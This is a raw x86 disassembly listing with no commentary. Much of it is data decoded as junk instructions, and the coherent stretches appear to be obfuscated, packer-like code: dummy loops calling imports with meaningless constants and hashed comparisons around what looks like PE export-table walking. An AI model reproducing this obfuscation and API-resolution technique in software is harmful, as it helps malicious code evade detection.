  40a83e:	sbb    eax,0x35e06adb
  40a843:	sar    cl,cl
  40a845:	mov    dh,0xd3
  40a847:	fnsave [edi+0x8]
  40a84a:	ffreep st(4)
  40a84c:	add    eax,0xafd9c8ca
  40a851:	(bad)  
  40a852:	adc    BYTE PTR [edi],ah
  40a854:	pop    es
  40a855:	sti    
  40a856:	pop    edx
  40a857:	sub    DWORD PTR [edx-0x54],edi
  40a85a:	push   esi
  40a85b:	push   ss
  40a85c:	in     eax,0x28
  40a85e:	add    eax,0xc9a8cc0e
  40a863:	into   
  40a864:	ss mov cl,0x2e
  40a867:	lock mov bl,0x6e
  40a86a:	lds    ecx,FWORD PTR [ebx-0x76]
  40a86d:	jl     0x40a88f
  40a86f:	sub    esi,DWORD PTR [esi+0x545c9b6d]
  40a875:	nop
  40a876:	or     eax,0xfa938bfd
  40a87b:	and    dh,BYTE PTR fs:[edi]
  40a87e:	push   es
  40a87f:	fmul   st(7),st
  40a881:	stos   BYTE PTR es:[edi],al
  40a882:	sub    ebx,edx
  40a884:	rcl    BYTE PTR [ebx],0xba
  40a887:	mov    edi,0xad805fde
  40a88c:	pop    ebp
  40a88d:	push   es
  40a88e:	jo     0x40a839
  40a890:	popa   
  40a891:	or     al,0xb0
  40a893:	adc    BYTE PTR [eax],dl
  40a895:	dec    esp
  40a896:	or     eax,eax
  40a898:	popf   
  40a899:	inc    ebx
  40a89a:	adc    ch,bl
  40a89c:	fld    DWORD PTR [edi-0x67]
  40a89f:	mov    ch,0x6a
  40a8a1:	mov    BYTE PTR [edi-0x4f],0x66
  40a8a5:	add    dl,0x5d
  40a8a8:	cmp    eax,0x5fa3f405
  40a8ad:	dec    edi
  40a8ae:	jae    0x40a8b6
  40a8b0:	arpl   WORD PTR [ebx+0x40],di
  40a8b3:	jmp    0xdce18f84
  40a8b8:	je     0x40a844
  40a8ba:	mov    al,ds:0x6a7f9f53
  40a8bf:	adc    DWORD PTR [ecx-0x2d],ebx
  40a8c2:	bound  eax,QWORD PTR [eax+eiz*1-0x397946e0]
  40a8c9:	sbb    DWORD PTR [esi+0xe0d8916],edx
  40a8cf:	and    dl,0xe7
  40a8d2:	mov    al,al
  40a8d4:	adc    bh,BYTE PTR [ebp-0x3345fcd7]
  40a8da:	aaa    
  40a8db:	mov    ds:0x8a3bea,eax
  40a8e0:	xchg   dh,bh
  40a8e2:	dec    eax
  40a8e3:	scas   al,BYTE PTR es:[edi]
  40a8e4:	fisub  WORD PTR ds:0xcf4a3205
  40a8ea:	(bad)  
  40a8eb:	pop    ecx
  40a8ec:	add    eax,DWORD PTR [esi]
  40a8ee:	jmp    0x84c427a5
  40a8f3:	and    al,0xcd
  40a8f5:	push   edi
  40a8f6:	bound  esp,QWORD PTR [edx]
  40a8f8:	cs jmp 0x40a968
  40a8fb:	mov    edx,0x355f5ddf
  40a900:	adc    eax,0xb580b46
  40a905:	push   eax
  40a906:	(bad)
  40a909:	add    esp,edx
  40a90b:	sbb    eax,0xe8802616
  40a910:	push   ss
  40a911:	push   edx
  40a912:	adc    BYTE PTR [ebp-0x3],0x18
  40a916:	addr16 ja 0x40a910
  40a919:	ror    BYTE PTR [esi-0x75],1
  40a91c:	inc    ebp
  40a91d:	cld    
  40a91e:	push   esi
  40a91f:	or     DWORD PTR ds:0x41abe2,edx
  40a925:	mov    esi,DWORD PTR [ebp-0x8]
  40a928:	and    DWORD PTR ds:0x412370,0x0
  40a932:	mov    ecx,DWORD PTR ds:0x412370
  40a938:	inc    ecx
  40a939:	mov    DWORD PTR ds:0x412370,ecx
  40a93f:	cmp    DWORD PTR ds:0x412370,0x26
  40a946:	jne    0x40a962
  40a94c:	push   DWORD PTR [ebp-0x14]
  40a94f:	push   DWORD PTR [ebp-0x24]
  40a952:	push   0x8e18
  40a957:	push   0x31c8
  40a95c:	call   DWORD PTR ds:0x40d024
  40a962:	cmp    DWORD PTR ds:0x412370,0x1b
  40a969:	jb     0x40a932
  40a96f:	mov    edx,0x7510859
  40a974:	xor    eax,edx
  40a976:	xor    esi,edx
  40a978:	mov    ecx,0x32729f
  40a97d:	add    esi,ecx
  40a97f:	add    eax,ecx
  40a981:	imul   eax,esi
  40a984:	mov    esi,DWORD PTR [ebp+0xc]
  40a987:	cmp    esi,eax
  40a989:	jne    0x40ac95
  40a98f:	mov    eax,DWORD PTR [ebp-0x4]
  40a992:	mov    esi,DWORD PTR [ebp-0x8]
  40a995:	jmp    0x40ab0d
  40a99a:	addr16 jno 0x40a945
  40a99d:	mov    ds:0xc965bb78,eax
  40a9a2:	jl     0x40a9a2
  40a9a4:	arpl   bx,dx
  40a9a6:	rol    DWORD PTR [ebp-0x57],0x2e
  40a9aa:	loopne 0x40a9e6
  40a9ac:	jle    0x40aa2c
  40a9ae:	lds    edi,FWORD PTR [edi+0x7e]
  40a9b1:	jle    0x40a9a5
  40a9b3:	cmpxchg BYTE PTR [ebx],al
  40a9b6:	test   BYTE PTR [edi],dh
  40a9b8:	xor    bl,BYTE PTR [esi]
  40a9ba:	hlt    
  40a9bb:	xor    al,0xf0
  40a9bd:	es in  eax,0xe5
  40a9c0:	lods   eax,DWORD PTR ds:[esi]
  40a9c1:	cmp    eax,0x32921d9b
  40a9c6:	adc    dh,BYTE PTR [edx+eiz*4+0x14]
  40a9ca:	inc    ecx
  40a9cb:	ins    DWORD PTR es:[edi],dx
  40a9cc:	int3   
  40a9cd:	stc    
  40a9ce:	data16 out dx,al
  40a9d0:	push   ecx
  40a9d1:	mov    edi,0xc71668d8
  40a9d6:	nop
  40a9d7:	cmp    DWORD PTR [eax+eax*2-0x6ae0bdb0],ecx
  40a9de:	sub    BYTE PTR [ebp+0x3e],bh
  40a9e1:	xchg   ebx,eax
  40a9e2:	rcr    BYTE PTR ds:0xa70d8b5f,1
  40a9e8:	mov    bl,0xcd
  40a9ea:	ds inc edx
  40a9ec:	int    0x7
  40a9ee:	inc    edi
  40a9ef:	cmc    
  40a9f0:	add    al,0x27
  40a9f2:	in     al,0x7a
  40a9f4:	xor    bl,BYTE PTR ds:[esi-0x4ab10182]
  40a9fb:	mov    WORD PTR [eax],ss
  40a9fd:	mov    ecx,0x6c8670ea
  40aa02:	push   esi
  40aa03:	push   esi
  40aa04:	jae    0x40a9e6
  40aa06:	and    DWORD PTR [eax+0x3e42bd0],esp
  40aa0c:	dec    edx
  40aa0d:	repz (bad) 
  40aa0f:	adc    eax,DWORD PTR [edx-0x54]
  40aa12:	jle    0x40aa37
  40aa14:	mul    DWORD PTR ds:0x9df35904
  40aa1a:	xor    dl,BYTE PTR [ecx+0x117e41f0]
  40aa20:	push   cs
  40aa21:	and    DWORD PTR [edx-0x3],esi
  40aa24:	call   0xc217baf6
  40aa29:	sub    esp,DWORD PTR [eax+edi*2-0x1d]
  40aa2d:	stc    
  40aa2e:	out    0x2b,eax
  40aa30:	mov    dh,0xf9
  40aa32:	add    BYTE PTR [edi],cl
  40aa34:	aam    0xdc
  40aa36:	push   ecx
  40aa37:	add    DWORD PTR [edx],ebp
  40aa39:	cwde   
  40aa3a:	cmp    DWORD PTR fs:[edi],0xffffffdc
  40aa3e:	xor    eax,0xa73eae2a
  40aa43:	adc    al,0x1a
  40aa45:	sti    
  40aa46:	sub    eax,0x77b15ec0
  40aa4b:	es pop esp
  40aa4d:	ss scas eax,DWORD PTR es:[edi]
  40aa4f:	test   al,0x71
  40aa51:	add    DWORD PTR [edi+ebx*2+0x3f7ca3d1],edx
  40aa58:	and    eax,0x9c090af4
  40aa5d:	shr    BYTE PTR [ecx-0x18],0xd0
  40aa61:	cli    
  40aa62:	push   esi
  40aa63:	add    al,ah
  40aa65:	xchg   edi,eax
  40aa66:	daa    
  40aa67:	mov    ecx,es
  40aa69:	es addr16 cmp al,0xf6
  40aa6d:	sbb    DWORD PTR [ebx],edi
  40aa6f:	inc    ebp
  40aa70:	imul   ebx,DWORD PTR [ebp+0x10b5581c],0x71
  40aa77:	sub    al,0x5a
  40aa79:	shr    eax,cl
  40aa7b:	adc    eax,0x2bc159b7
  40aa80:	xor    al,0x7f
  40aa82:	(bad)  
  40aa83:	loop   0x40aa94
  40aa85:	into   
  40aa86:	shr    dl,0xae
  40aa89:	jmp    0xb9889e24
  40aa8e:	xchg   cl,al
  40aa90:	mov    ebx,DWORD PTR [ebx-0x51029da2]
  40aa96:	shr    DWORD PTR [ebx-0x76],1
  40aa99:	pop    ebx
  40aa9a:	out    dx,al
  40aa9b:	ins    DWORD PTR es:[edi],dx
  40aa9c:	iret   
  40aa9d:	sbb    dl,bl
  40aa9f:	push   eax
  40aaa0:	or     al,0x1
  40aaa2:	shr    BYTE PTR [esi-0x6a],1
  40aaa5:	mov    ebx,0xad45d1fc
  40aaaa:	and    al,0x94
  40aaac:	dec    edx
  40aaad:	fisub  DWORD PTR [edi+0x3b]
  40aab0:	in     al,dx
  40aab1:	add    ebx,ebp
  40aab3:	imul   eax,DWORD PTR [ecx],0xf5fc9260
  40aab9:	ja     0x40ab00
  40aabb:	ins    DWORD PTR es:[edi],dx
  40aabc:	cs jmp 0x7f29:0x6efcc524
  40aac4:	outs   dx,BYTE PTR ds:[esi]
  40aac5:	or     eax,0x69861f5e
  40aaca:	cdq    
  40aacb:	cmp    ch,BYTE PTR [ebx-0x1157f10d]
  40aad1:	add    bh,BYTE PTR [ecx-0x16b200d2]
  40aad7:	xor    DWORD PTR [ecx+0x61],ebx
  40aada:	rol    DWORD PTR [esi+0x5d],0x94
  40aade:	leave  
  40aadf:	and    al,0xf8
  40aae1:	das    
  40aae2:	pop    ebx
  40aae3:	sbb    al,0x35
  40aae5:	es or  al,cl
  40aae8:	mov    eax,ds:0xbad4cd12
  40aaed:	imul   edx,DWORD PTR [ebp-0x35],0x4c
  40aaf1:	mov    ah,0x4d
  40aaf3:	ret    0x91df
  40aaf6:	sub    al,0xd3
  40aaf8:	cmp    BYTE PTR [edx+0x50],dh
  40aafb:	sbb    ch,dh
  40aafd:	out    dx,al
  40aafe:	mul    DWORD PTR [ebp-0x61064c61]
  40ab04:	xchg   ebp,eax
  40ab05:	add    bh,BYTE PTR [ecx-0x5e88ac99]
  40ab0b:	retf   0x336e
  40ab0e:	ret    0xf233
  40ab11:	add    eax,ecx
  40ab13:	jmp    0x40ac8b
  40ab18:	jg     0x40aacf
  40ab1a:	add    eax,0x117b453b
  40ab1f:	jns    0x40aab9
  40ab21:	cmp    eax,0x38efac8b
  40ab26:	sub    BYTE PTR [edx+0x4f],bl
  40ab29:	cmp    edi,DWORD PTR [esi+0x7e]
  40ab2c:	lds    edi,FWORD PTR [edi+0x7e]
  40ab2f:	jle    0x40ab8d
  40ab31:	jmp    0x47eb1396
  40ab36:	sub    DWORD PTR [edx],ebx
  40ab38:	into   
  40ab39:	into   
  40ab3a:	mov    dh,BYTE PTR [edx+ecx*8]
  40ab3d:	iret   
  40ab3e:	xor    esi,edi
  40ab40:	jnp    0x40ab74
  40ab42:	dec    edx
  40ab43:	dec    ecx
  40ab44:	(bad)  
  40ab45:	mul    DWORD PTR [esi+eiz*1-0x445ba270]
  40ab4c:	das    
  40ab4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab4e:	bound  ebp,QWORD PTR [edi-0x7430f752]
  40ab54:	inc    ecx
  40ab55:	sub    esi,DWORD PTR [ecx]
  40ab57:	fs dec eax
  40ab59:	adc    al,0xaf
  40ab5b:	xchg   edx,eax
  40ab5c:	sbb    al,0x53
  40ab5e:	or     ebp,DWORD PTR [ebp-0x77807f83]
  40ab64:	push   edi
  40ab65:	int3   
  40ab66:	xor    DWORD PTR [eax+0x2a280b01],0x3d
  40ab6d:	inc    esi
  40ab6e:	adc    eax,0xf6e89994
  40ab73:	(bad)  
  40ab74:	(bad)  [edi-0x75]
  40ab77:	pop    esp
  40ab78:	push   0x762e4c7a
  40ab7d:	ss inc edx
  40ab7f:	pop    ecx
  40ab80:	jl     0x40abaa
  40ab82:	mov    dl,0x54
  40ab84:	xchg   esp,eax
  40ab85:	inc    ecx
  40ab86:	out    dx,eax
  40ab87:	jns    0x40ac00
  40ab89:	fild   QWORD PTR [ebx]
  40ab8b:	xor    BYTE PTR [esi+0xf],bl
  40ab8e:	call   0x375e306f
  40ab93:	push   ebx
  40ab94:	or     al,BYTE PTR [ecx-0x3179435]
  40ab9a:	xchg   DWORD PTR [edx-0x52],eax
  40ab9d:	mov    cl,0x2a
  40ab9f:	mov    ch,0x90
  40aba1:	push   ebx
  40aba2:	ins    DWORD PTR es:[edi],dx
  40aba3:	sbb    ebp,eax
  40aba5:	nop
  40aba6:	mov    al,ds:0xa7763e8d
  40abab:	sti    
  40abac:	rcr    DWORD PTR [esi],cl
  40abae:	fisubr DWORD PTR [esi+0x49]
  40abb1:	jbe    0x40abf5
  40abb3:	xor    al,0x20
  40abb5:	xchg   ebp,eax
  40abb6:	sub    cl,bh
  40abb8:	(bad)  
  40abb9:	out    dx,eax
  40abba:	jg     0x40abd9
  40abbc:	repz mov ah,0xe4
  40abbf:	neg    dl
  40abc1:	sbb    DWORD PTR [eax],ebp
  40abc3:	mov    esi,0x6c560ad6
  40abc8:	cli    
  40abc9:	cmp    DWORD PTR [ecx-0x1f],ebx
  40abcc:	push   ss
  40abcd:	in     al,0xf
  40abcf:	xchg   ebp,eax
  40abd0:	sub    al,0x87
  40abd2:	sti    
  40abd3:	and    esp,ecx
  40abd5:	pop    edi
  40abd6:	inc    ecx
  40abd7:	mov    eax,0xec06d10
  40abdc:	mov    WORD PTR [esi-0x71c2c3a6],?
  40abe2:	add    DWORD PTR [edx+0x7af9e172],ecx
  40abe8:	imul   esi,DWORD PTR [eax],0x905f6b2c
  40abee:	icebp  
  40abef:	int    0x2
  40abf1:	mov    ds:0x3ee8150,al
  40abf6:	mov    dh,BYTE PTR [eax-0x28a74b4f]
  40abfc:	out    0xaf,eax
  40abfe:	mov    esi,0xc7bb22c6
  40ac03:	rcr    esp,1
  40ac05:	push   ss
  40ac06:	ins    DWORD PTR es:[edi],dx
  40ac07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac08:	js     0x40ac88
  40ac0a:	xchg   edx,eax
  40ac0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac0c:	call   0xd29c8168
  40ac11:	sub    DWORD PTR [esp-0x40],ebp
  40ac15:	js     0x40abae
  40ac17:	ss xchg ecx,eax
  40ac19:	adc    dh,BYTE PTR [ebp+esi*4-0x2a4d7542]
  40ac20:	mov    esp,0xca4d5568
  40ac25:	adc    bl,BYTE PTR [edx+0x3a0e8a19]
  40ac2b:	mov    ecx,0xa8a746a6
  40ac30:	dec    edi
  40ac32:	stos   BYTE PTR es:[edi],al
  40ac33:	mov    esi,0x8695b00c
  40ac38:	div    bh
  40ac3a:	jo     0x40aca3
  40ac3c:	(bad)
  40ac3f:	and    al,0x60
  40ac41:	cmc    
  40ac42:	aad    0xc1
  40ac44:	push   ds
  40ac45:	hlt    
  40ac46:	add    cl,BYTE PTR [edi]
  40ac48:	loope  0x40abfd
  40ac4a:	neg    DWORD PTR [eax+0x51ef9423]
  40ac50:	inc    ebp
  40ac51:	dec    edi
  40ac52:	data16 fld st(7)
  40ac55:	push   esp
  40ac56:	sbb    DWORD PTR [edx],esp
  40ac58:	ror    BYTE PTR [ecx],0x1d
  40ac5b:	mov    edi,DWORD PTR [edi-0x44]
  40ac5e:	outs   dx,BYTE PTR ds:[esi]
  40ac5f:	popf   
  40ac60:	jo     0x40ac2d
  40ac62:	mov    BYTE PTR [ebx+0x48145d80],al
  40ac68:	jl     0x40ac0b
  40ac6a:	xor    al,0xe0
  40ac6c:	mov    bh,0xe1
  40ac6e:	sub    ah,0xae
  40ac71:	lods   eax,DWORD PTR ds:[esi]
  40ac72:	hlt    
  40ac73:	es jmp 0x40abfc
  40ac76:	add    BYTE PTR [eax+0x5f6f37a7],dh
  40ac7c:	xchg   ecx,eax
  40ac7d:	call   0x79c8c960
  40ac82:	mov    al,ds:0xfb4c1af0
  40ac87:	sub    eax,0x36ce4ec
  40ac8c:	icebp  
  40ac8d:	imul   eax,esi
  40ac90:	jmp    0x40ae48
  40ac95:	mov    eax,DWORD PTR [ebp+0xc]
  40ac98:	mov    eax,DWORD PTR [eax+0x78]
  40ac9b:	mov    DWORD PTR [ebp+0xc],eax
  40ac9e:	mov    eax,DWORD PTR [ebp-0x4]
  40aca1:	mov    esi,DWORD PTR [ebp-0x8]
  40aca4:	xor    eax,edx
  40aca6:	xor    esi,edx
  40aca8:	add    eax,ecx
  40acaa:	jmp    0x40ae22
  40acaf:	push   ss
  40acb0:	mov    esp,0xb169beb3
  40acb5:	sub    edx,DWORD PTR [esp+edx*4-0x31]
  40acb9:	cmc    
  40acba:	sub    edx,eax
  40acbc:	rcr    BYTE PTR cs:[edx+ebp*1+0x39],1
  40acc1:	jle    0x40ad41
  40acc3:	lds    edi,FWORD PTR [edi+0x7e]
  40acc6:	jle    0x40acce
  40acc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acc9:	lods   eax,DWORD PTR ds:[esi]
  40acca:	jg     0x40ac8e
  40accc:	mov    ebp,0x3b1446dc
  40acd1:	xchg   DWORD PTR [edi+0x2102da78],ecx
  40acd7:	loopne 0x40ad3e
  40acd9:	mov    ah,cl
  40acdb:	dec    edi
  40acdc:	xchg   BYTE PTR [eax*2+0x6ff1b1e6],dh
  40ace3:	jns    0x40ad4f
  40ace5:	out    dx,al
  40ace6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ace7:	ds leave 
  40ace9:	test   eax,0xd6b0d9fe
  40acee:	clc    
  40acef:	mov    dh,0xe1
  40acf1:	xor    dl,BYTE PTR [ebx-0x2dcf7289]
  40acf7:	(bad)  
  40acf8:	nop
  40acf9:	mov    edi,0x8e7ce48e
  40acfe:	sbb    DWORD PTR [ecx+eax*8-0xd3e93ca],esi
  40ad05:	lods   eax,DWORD PTR ds:[esi]
  40ad06:	rcr    BYTE PTR [eax-0x388cf0df],1
  40ad0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad0d:	cld    
  40ad0e:	mov    al,dl
  40ad10:	pop    ebx
  40ad11:	fsubrp st(3),st
  40ad13:	push   ecx
  40ad14:	inc    edx
  40ad15:	icebp  
  40ad16:	aaa    
  40ad17:	in     eax,dx
  40ad18:	sub    esi,DWORD PTR [ebx+0x16301d75]
  40ad1e:	sbb    dh,al
  40ad20:	ror    edi,0xab
  40ad23:	dec    esp
  40ad24:	inc    dh
  40ad26:	pop    ecx
  40ad27:	sbb    dh,ch
  40ad29:	pop    ebp
  40ad2a:	sub    DWORD PTR [ebx+ecx*8+0x6b],ecx
  40ad2e:	fsub   DWORD PTR [ebx+esi*1+0x51007b96]
  40ad35:	test   al,0xf2
  40ad37:	inc    esi
  40ad38:	cwde   
  40ad39:	xor    al,BYTE PTR [eax-0x2a]
  40ad3c:	mov    esp,0x172cbf78
  40ad41:	and    eax,0x81439982
  40ad46:	dec    esi
  40ad47:	inc    ecx
  40ad48:	repnz push ss
  40ad4a:	cld    
  40ad4b:	and    ah,BYTE PTR [esi+0x5b23a61d]
  40ad51:	out    dx,al
  40ad52:	pop    ss
  40ad53:	pop    ds
  40ad54:	frstor [esi-0x2e]
  40ad57:	lds    esp,FWORD PTR [ebp-0xfa9b47e]
  40ad5d:	jno    0x40ad5c
  40ad5f:	lahf   
  40ad60:	neg    DWORD PTR [edi+0x54]
  40ad63:	or     BYTE PTR [esp+eax*4],0x5e
  40ad67:	aaa    
  40ad68:	icebp  
  40ad69:	call   0xc0b0:0x4035cd5e
  40ad70:	xchg   esi,eax
  40ad71:	loope  0x40ad81
  40ad73:	adc    al,0xea
  40ad75:	fidivr DWORD PTR [eax]
  40ad77:	add    eax,0x8c649ff4
  40ad7c:	and    cl,cl
  40ad7e:	std    
  40ad7f:	nop
  40ad80:	add    BYTE PTR [ebx],0xb4
  40ad83:	test   al,0x4d
  40ad85:	sbb    al,BYTE PTR [ecx+0x60]
  40ad88:	test   BYTE PTR [esp+eax*1+0x713f3a39],dh
  40ad8f:	adc    DWORD PTR [ecx+0x4199fb6d],eax
  40ad95:	pushf  
  40ad96:	das    
  40ad97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad98:	(bad)  
  40ad99:	and    al,0x3f
  40ad9b:	push   esp
  40ad9c:	arpl   WORD PTR [ecx-0x53f9ee6b],cx
  40ada2:	aas    
  40ada3:	push   ebx
  40ada4:	mov    BYTE PTR [esi+0x32],bh
  40ada7:	or     ebp,edx
  40ada9:	in     al,0x9f
  40adab:	mov    bh,0xae
  40adad:	pop    eax
  40adae:	mov    dh,BYTE PTR [edx+0x6a]
  40adb1:	test   DWORD PTR [edi+0x6bf1ac82],0xfa870931
  40adbb:	out    0xdb,al
  40adbd:	imul   esi,DWORD PTR [ecx+eax*2],0x6482c3a1
  40adc4:	jl     0x40ad8e
  40adc6:	push   esp
  40adc7:	mov    cl,0x6f
  40adc9:	cli    
  40adca:	jbe    0x40ada9
  40adcc:	pusha  
  40adcd:	cmp    eax,0x4c8567e9
  40add2:	je     0x40ae24
  40add4:	fcomp  DWORD PTR [ebx+0x54fc3ab7]
  40adda:	imul   ebp,DWORD PTR [edx-0x7fbde93c],0x5483ff08
  40ade4:	int    0x2f
  40ade6:	jo     0x40ad6a
  40ade8:	shl    bh,cl
  40adea:	and    DWORD PTR [ebx-0x3869bfe8],esp
  40adf0:	jne    0x40adaa
  40adf2:	and    BYTE PTR [esi+0x60],dl
  40adf5:	xor    al,0x90
  40adf7:	enter  0xbdd4,0xb7
  40adfb:	mov    gs,WORD PTR ds:0x8b5137aa
  40ae01:	and    ch,dl
  40ae03:	imul   eax,DWORD PTR [ebx-0x35d20582],0xdcfce57f
  40ae0d:	jge    0x40ae58
  40ae0f:	lock sbb DWORD PTR [ecx+0xc],edx
  40ae13:	sbb    DWORD PTR [esi],esi
  40ae15:	dec    eax
  40ae16:	test   al,0x25
  40ae18:	ja     0x40addd
  40ae1a:	popf   
  40ae1b:	xchg   ah,bh
  40ae1d:	or     DWORD PTR [edx-0x6b],edx
  40ae20:	jb     0x40ae0d
  40ae22:	add    esi,ecx
  40ae24:	imul   eax,esi
  40ae27:	mov    esi,DWORD PTR [ebp+0xc]
  40ae2a:	cmp    esi,eax
  40ae2c:	mov    eax,DWORD PTR [ebp-0x4]
  40ae2f:	je     0x40a992
  40ae35:	xor    eax,edx
  40ae37:	add    eax,ecx
  40ae39:	mov    ecx,DWORD PTR [ebp+0xc]
  40ae3c:	imul   eax,ecx
  40ae3f:	add    eax,DWORD PTR [ebp+0x8]
  40ae42:	mov    DWORD PTR [ebp+0xc],eax
  40ae45:	mov    eax,DWORD PTR [ebp+0xc]
  40ae48:	pop    esi
  40ae49:	leave  
  40ae4a:	ret    0x8
  40ae4d:	push   ebp
  40ae4e:	mov    ebp,esp
  40ae50:	sub    esp,0x30
  40ae53:	add    DWORD PTR ds:0x41abce,0x682
  40ae5d:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40ae64:	mov    DWORD PTR [ebp-0x18],0xf89c853b
  40ae6b:	dec    DWORD PTR ds:0x41abde
  40ae71:	mov    ecx,DWORD PTR [ebp-0x4]
  40ae74:	push   ebx
  40ae75:	mov    eax,0x7510859
  40ae7a:	xor    ebx,0x7bf6
  40ae80:	xor    ecx,eax
  40ae82:	jmp    0x40af67
  40ae87:	je     0x40aef6
  40ae89:	jg     0x40aea2
  40ae8b:	addr16 gs adc al,0x6d
  40ae8f:	test   eax,0x41268d5d
  40ae94:	xor    edx,DWORD PTR [edi+0x6a]
  40ae97:	icebp  
  40ae98:	ds jle 0x40af19
  40ae9b:	mov    dh,0x7e
  40ae9d:	jle    0x40af1d
  40ae9f:	add    BYTE PTR [edx],bh
  40aea1:	mov    edi,ecx
  40aea3:	mov    esi,0xe916c531
  40aea8:	je     0x40aef6
  40aeaa:	mov    ebp,DWORD PTR [eax-0x2d27c5ef]
  40aeb0:	lods   al,BYTE PTR ds:[esi]
  40aeb1:	mov    eax,ds:0x4f9782fd
  40aeb6:	cmp    eax,0xb3d3fc7e
  40aebb:	xchg   edi,eax
  40aebc:	inc    ebp
  40aebd:	pop    esp
  40aebe:	test   BYTE PTR [esi],bl
  40aec0:	mov    cl,0x1c
  40aec2:	imul   ebp,esp,0x6cfdeda8
  40aec8:	push   0xffffffb6
  40aeca:	sar    BYTE PTR [eax+edi*1],0xe0
  40aece:	dec    esp
  40aecf:	mov    dh,0x78
  40aed1:	mov    WORD PTR [edi],bx
  40aed4:	adc    edx,ebp
  40aed6:	test   edi,eax
  40aed8:	add    al,0x4
  40aeda:	sbb    DWORD PTR [edi-0x3cf26423],ebx
  40aee0:	cs pop es
  40aee2:	and    DWORD PTR [edx-0x62],0x4c
  40aee6:	xrelease xchg BYTE PTR ds:[ecx-0x4a],cl
  40aeeb:	loop   0x40af3b
  40aeed:	and    DWORD PTR [esi],edi
  40aeef:	push   0x3c
  40aef1:	ins    BYTE PTR es:[edi],dx
  40aef2:	mov    bh,0x75
  40aef4:	pop    ss
  40aef5:	stos   DWORD PTR es:[edi],eax
  40aef6:	outs   dx,DWORD PTR ds:[esi]
  40aef7:	aas    
  40aef8:	fsubp  st(6),st
  40aefa:	adc    al,0xed
  40aefc:	push   ds
  40aefd:	jl     0x40af54
  40aeff:	and    DWORD PTR [ecx+0x730b3d79],0xc466577b
  40af09:	ins    BYTE PTR es:[edi],dx
  40af0a:	push   ebp
  40af0b:	fisub  WORD PTR [edi-0x5c]
  40af0e:	inc    ebp
  40af0f:	scas   eax,DWORD PTR es:[edi]
  40af10:	jne    0x40af33
  40af12:	icebp  
  40af13:	cwde   
  40af14:	inc    edi
  40af15:	mov    edi,0xc89ad4b3
  40af1a:	ret    0x9504
  40af1d:	fld    TBYTE PTR [ebp+0x47]
  40af20:	je     0x40af2b
  40af22:	mov    al,BYTE PTR [ecx+0x1c]
  40af25:	and    DWORD PTR [eax+0x41],ebx
  40af28:	mul    DWORD PTR [eax+ecx*1-0x1]
  40af2c:	icebp  
  40af2d:	push   ds
  40af2e:	jl     0x40aef7
  40af30:	fldcw  WORD PTR [edi]
  40af32:	push   edx
  40af33:	mov    ebp,0x9cdbec90
  40af38:	mov    BYTE PTR [ebp+0xd],0x24
  40af3c:	ja     0x40af54
  40af3e:	(bad)  
  40af3f:	out    0xfa,ax
  40af42:	ror    BYTE PTR [ecx-0x65771705],1
  40af48:	push   edi
  40af49:	test   al,0x44
  40af4b:	dec    eax
  40af4c:	clc    
  40af4d:	clc    
  40af4e:	inc    esi
  40af4f:	shl    edi,1
  40af51:	and    al,0x47
  40af53:	ins    BYTE PTR es:[edi],dx
  40af54:	dec    BYTE PTR [esi]
  40af56:	mov    dl,0x15
  40af58:	push   ebp
  40af59:	les    ebx,FWORD PTR [ecx]
  40af5b:	pop    edx
  40af5c:	mov    bh,0x43
  40af5e:	leave  
  40af5f:	sti    
  40af60:	sub    eax,0xcf589e2d
  40af65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af66:	lods   al,BYTE PTR ds:[esi]
  40af67:	mov    ebx,0x32729f
  40af6c:	add    ecx,ebx
  40af6e:	and    DWORD PTR ds:0x412370,0x41abce
  40af78:	mov    DWORD PTR [ebp-0x1c],ecx
  40af7b:	mov    DWORD PTR ds:0x41235c,0x5a41
  40af85:	mov    ecx,DWORD PTR [ebp+0x14]
  40af88:	add    DWORD PTR ds:0x41abe6,0x41235c
  40af92:	push   esi
  40af93:	push   edi
  40af94:	or     DWORD PTR ds:0x41510d,0x36ef
  40af9e:	test   ecx,ecx
  40afa0:	je     0x40afae
  40afa6:	mov    ecx,DWORD PTR [ebp+0x14]
  40afa9:	mov    ecx,DWORD PTR [ecx]
  40afab:	mov    DWORD PTR [ebp-0x1c],ecx
  40afae:	movzx  edi,BYTE PTR ds:0x417e3d
  40afb5:	and    DWORD PTR ds:0x417e41,edi
  40afbb:	imul   edx,eax
  40afbe:	sub    DWORD PTR ds:0x412374,ecx
  40afc4:	mov    ecx,0x4573
  40afc9:	and    DWORD PTR ds:0x41abe2,0x0
  40afd3:	mov    esi,DWORD PTR ds:0x41abe2
  40afd9:	inc    esi
  40afda:	mov    DWORD PTR ds:0x41abe2,esi
  40afe0:	cmp    DWORD PTR ds:0x41abe2,0x22
  40afe7:	jne    0x40affd
  40afed:	push   0x2695
  40aff2:	push   0x8176
  40aff7:	call   DWORD PTR ds:0x40d3a0
  40affd:	cmp    DWORD PTR ds:0x41abe2,0x1e
  40b004:	jb     0x40afd3
  40b00a:	add    edx,ecx
  40b00c:	and    DWORD PTR ds:0x41abca,0x0
  40b016:	jmp    0x40b02a
  40b01b:	xor    edi,edi
  40b01d:	xor    edi,DWORD PTR ds:0x41abca
  40b023:	inc    edi
  40b024:	mov    DWORD PTR ds:0x41abca,edi
  40b02a:	cmp    DWORD PTR ds:0x41abca,0x12
  40b031:	jae    0x40b05b
  40b037:	cmp    DWORD PTR ds:0x41abca,0x1d
  40b03e:	jne    0x40b054
  40b044:	push   0x27af
  40b049:	push   0x17d7
  40b04e:	call   DWORD PTR ds:0x40d028
  40b054:	jmp    0x40b01b
  40b059:	or     esi,edi
  40b05b:	mov    esi,0x7879
  40b060:	mov    edi,0x1556
  40b065:	mov    DWORD PTR ds:0x4235c3,0x3a32
  40b06f:	xchg   esi,ecx
  40b071:	mov    ecx,DWORD PTR ds:0x41238c
  40b077:	mov    ecx,DWORD PTR [ecx]
  40b079:	or     DWORD PTR ds:0x417e49,ecx
  40b07f:	sub    edx,edi
  40b081:	and    ecx,DWORD PTR ds:0x412368
  40b087:	xor    esi,esi
  40b089:	adc    ecx,DWORD PTR ds:0x4235bf
